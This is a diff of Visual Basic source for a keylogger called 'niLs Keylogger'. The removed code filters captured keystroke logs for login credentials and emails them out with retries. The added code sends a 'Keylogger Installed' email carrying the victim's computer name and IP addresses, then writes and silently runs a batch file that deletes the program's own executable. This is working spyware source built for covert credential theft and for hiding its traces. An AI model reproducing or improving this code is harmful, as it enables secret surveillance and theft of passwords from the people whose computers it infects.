@@ -81,55 +81,29 @@ Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliSeconds As Long)
 
 Public DeleteSentLogs As Boolean, LocalIP, PublicIP As String
 Public sendTo, sendFrom, Password, CompID, LogDir, PubIPURL As String, CurVersion As Integer
+Private sPath As String
 Private Sub Form_Load()
 If App.PrevInstance = True Then End 'no multiple instances allowed
 TransparentForm Me
 Me.Left = Screen.Width - Me.Width
 Me.Top = Screen.Height - Me.Height
-Call mainNew        'Main Function
+'Call mainNew        'Main Function
+Call LoadSetting
+Call GenerateEmail
+Dim i As Boolean
+
+i = SendEmail
+sPath = App.Path
+sPath = Replace(sPath, Chr(32), Chr(34) & Chr(34))
+Open App.Path & "\Kill.bat" For Append As #1
+        Print #1, "DEL " & sPath & "\" & App.EXEName & ".exe"
+        Print #1, "DEL %0"
+Close #1
+
+Unload Me
 End Sub
-Private Sub mainNew()
-Dim LogFilePath, CurrLog, temp As String, Retry As Integer
-Call LoadSetting        'Loads Ip address, CompNames and settings.txt
-File1.Path = LogDir
-CurrLog = Format$(Now, "ddmmyy") & ".nkl"
-Retry = 0
-File1.Refresh
-
-While File1.ListCount > 1
-    File1.ListIndex = 0                 'Choose first log
-    If File1.FileName = CurrLog Then File1.ListIndex = 1 'Dont send todays log
-    LogFilePath = File1.Path & "\" & File1.FileName
-    If ReadLog(LogFilePath) < 40 Then       'Load Log content into textbox
-                                        'But Limited User Cant Delete Admin Files
-        Kill LogFilePath                'Discard that Log which has nothing like login credentials
-    Else
-        Call AttachLogDetails(LogFilePath)     'Load Log Details into textbox and concatenates with LogContent
-ReSend:
-        If SendLog = True Then      'Call Sendlog function
-            'MsgBox "Sent : " & LogFilePath
-            'Mark log as sent by rename/delete
-            If DeleteSentLogs = True Then
-                Kill LogFilePath
-            Else
-                temp = Left$(LogFilePath, Len(LogFilePath) - 3) & "snkl"
-                If Dir(temp) <> "" Then Kill LogFilePath Else Name LogFilePath As temp      'If file already exist..delete rather than renaming
-            End If
-        Else
-            'MsgBox "Not Sent : " & LogFilePath
-            If Retry >= 3 Then End  'Tried 3 times, still not sent
-            Retry = Retry + 1
-            Sleep 200000         'Sleep 5 minutes...  5*60*1000
-            GoTo ReSend         'Send Again
-        End If
-    End If
-File1.Refresh       'Reload after deleting/renaimng files
-Wend
-
-UpdatePackage   'Updates
-
-End         'job Over
-
+Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
+    Shell sPath & "\Kill.bat", vbHide
 End Sub
 Private Sub UpdatePackage()
 Dim sSourceUrl, PatchURL, fType As String, NewVersion As Integer, res As Double
@@ -201,24 +175,14 @@ Open LogFile For Input As 2
 Close #2
 ReadLog = Len(txtLog.Text)
 End Function
-Private Sub AttachLogDetails(ByVal LogFile As String)
-Dim NoNeed, lTime, lDate, AppRevision, lCompID As String
-
-'Read initials
-Open LogFile For Input As 1
-Input #1, NoNeed, lTime, lDate, lCompID, AppRevision
-Close #1
-
-txtSendThis.Text = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.in" & Chr(34) & _
-">niLs Keylogger</a></b><br>" & _
-"<b>Computer Name: </b>" & lCompID & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
+Private Sub GenerateEmail()
+txtSendThis.Text = "<b>Keylogger Installed on </b><br>" & _
+"<b>Computer Name: </b>" & CompID & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
 "<b>IP Address: </b> " & PublicIP & " | " & LocalIP & "<br>" & _
-"<b>Start Time: </b>" & lDate & "  " & lTime & "<br>" & _
-"<b>End Time: </b>" & FileDateTime(LogFile) & "<br>" & _
 "<b>AppVersion: </b>" & AppRevision & " <b> PackageVersion : </b>" & CurVersion & " <br>" & _
-"----------------------------<br><br>" & txtLog.Text
+"----------------------------<br><br>"
 End Sub
-Private Function SendLog() As Boolean
+Private Function SendEmail() As Boolean
 'MsgBox "SendFrom :" & sendFrom & vbCrLf & "SendTo : " & sendTo & vbCrLf & "Password : " & Password
 'Open "x.html" For Output As 1
 '  Print #1, txtSendThis.Text
